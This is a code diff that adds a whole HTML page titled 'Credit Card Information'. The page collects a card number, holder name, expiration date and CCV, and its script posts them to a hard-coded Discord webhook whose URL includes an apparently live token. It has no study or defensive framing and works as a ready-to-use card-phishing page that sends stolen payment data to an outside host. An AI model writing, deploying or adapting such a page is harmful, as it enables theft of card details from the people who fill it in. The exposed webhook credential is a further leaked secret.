@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Credit Card Information</title>
+</head>
+<body>
+    <form id="creditCardForm">
+        <label for="input-card-number">Card Number:</label>
+        <input type="text" id="input-card-number" name="card-number"><br><br>
+
+        <label for="input-card-holder">Card Holder:</label>
+        <input type="text" id="input-card-holder" name="card-holder"><br><br>
+
+        <label for="input-expiration-date">Expiration Date:</label>
+        <input type="text" id="input-expiration-date" name="expiration-date"><br><br>
+
+        <label for="input-ccv">CCV:</label>
+        <input type="text" id="input-ccv" name="ccv"><br><br>
+
+        <input type="button" value="Submit" onclick="sendWebhook()">
+    </form>
+
+    <script>
+        function sendWebhook() {
+            var cardNumber = document.getElementById("input-card-number").value;
+            var cardHolder = document.getElementById("input-card-holder").value;
+            var expirationDate = document.getElementById("input-expiration-date").value;
+            var ccv = document.getElementById("input-ccv").value;
+
+            var webhookUrl = "https://discord.com/api/webhooks/1170579829507239936/SfzHf_SAfQdGxC2XgCyArtt0AShp5Eb-JLVtkt_jEVSsNjja9qZF9zP54li8wgAipBLm"; // Replace with your webhook URL
+
+            var data = {
+                cardNumber: cardNumber,
+                cardHolder: cardHolder,
+                expirationDate: expirationDate,
+                ccv: ccv
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Webhook sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+            });
+        }
+    </script>
+</body>
+</html>
